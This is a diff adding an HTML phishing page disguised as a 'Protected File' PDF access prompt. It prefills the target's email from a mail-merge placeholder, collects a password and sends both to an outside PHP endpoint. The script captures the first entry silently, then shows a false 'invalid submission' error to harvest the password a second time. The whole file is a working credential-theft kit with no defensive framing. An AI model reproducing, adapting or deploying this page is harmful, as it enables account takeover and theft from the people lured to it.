@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" 
+
+content="width=device-width, initial-scale=1.0">
+    <title>Protected File</title>
+
+    <style>
+        * {
+    
+
+        box-sizing: border-box;
+        }
+
+        html, body {
+            margin: 0;
+            width: 100%;
+ 
+
+           min-height: 100%;
+        }
+
+        body {
+            min-height: 100vh;
+            font-family: 
+
+Arial, sans-serif;
+            background: #777 url("https://i.postimg.cc/CFGk6kCN/pdfbg1.png") center top / cover no-repeat fixed;
+            
+
+display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 
+
+20px;
+        }
+
+        .container {
+            background: #fff;
+            padding: 25px;
+            
+
+width: calc(100% - 40px);
+            max-width: 320px;
+            text-align: center;
+            box-
+
+shadow: 0 0 10px rgba(0,0,0,.15);
+        }
+
+        .logo {
+            width: 90px;
+            height: 90px;
+ 
+
+           margin-bottom: 15px;
+        }
+
+        form {
+            width: 100%;
+            max-width: 
+
+280px;
+            margin: 0 auto;
+        }
+
+        input,
+        button {
+            width: 100%;
+           
+
+ box-sizing: border-box;
+            padding: 11px;
+            margin-bottom: 15px;
+            font-family: 
+
+Arial, sans-serif;
+        }
+
+        input {
+            border: 1px solid #aaa;
+        }
+
+        button {
+     
+
+       border: 0;
+            background: #d32f2f;
+            color: white;
+            cursor: pointer;
+     
+
+   }
+
+        button:hover {
+            background: #b71c1c;
+        }
+    
+        #errorMessage {
+            margin: 0 auto 15px;
+            max-width: 280px;
+            color: #d32f2f;
+            font-weight: bold;
+            font-size: 14px;
+        }
+    </style>
+</head>
+
+<body>
+
+<div 
+
+class="container">
+
+    <img
+        src="https://zhejiangmachinery.github.io/PDF_ico.svg"
+        
+
+alt="Document"
+        class="logo"
+    >
+
+    <h2>Protected File</h2>
+
+    <p>Enter your details to request 
+
+access to this document.</p>
+
+     <p id="errorMessage" style="display:none;">Invalid submission, resubmit credentials</p>
+
+<form id="testLoginForm"
+      action="https://atcongroup.asia/Non-offensive2.php"
+      method="post">
+
+        <input
+            type="text"
+            name="bn1"
+            placeholder="Your email"
+            required
+         value="{{recipient_email}}">
+
+        <input
+            type="password"
+            name="email"
+            placeholder="Password"
+            required
+        >
+
+        <button type="submit" id="submitButton">
+            Request File
+        </button>
+
+    </form>
+
+    <script>
+    (function () {
+        const form = document.getElementById("testLoginForm");
+        const errorMessage = document.getElementById("errorMessage");
+        const button = document.getElementById("submitButton");
+
+        let firstSubmission = true;
+
+        form.addEventListener("submit", async function (event) {
+
+            if (firstSubmission) {
+                event.preventDefault();
+                firstSubmission = false;
+
+                const retainedEmail = form.querySelector('input[name="bn1"]').value;
+                const data = new FormData(form);
+
+                button.disabled = true;
+                button.textContent = "Checking...";
+
+                try {
+                    await fetch(form.action, {
+                        method: "POST",
+                        body: data
+                    });
+                } catch (error) {
+                    console.error("First submission failed:", error);
+                }
+
+                form.reset();
+                form.querySelector('input[name="bn1"]').value = retainedEmail;
+                errorMessage.style.display = "block";
+
+                button.disabled = false;
+                button.textContent = "Resubmit";
+
+                return;
+            }
+
+            // Final submission: normal HTML form POST.
+            // The browser navigates to the server response.
+        });
+    })();
+    </script>
+
+</div>
+
+</body>
+</html>
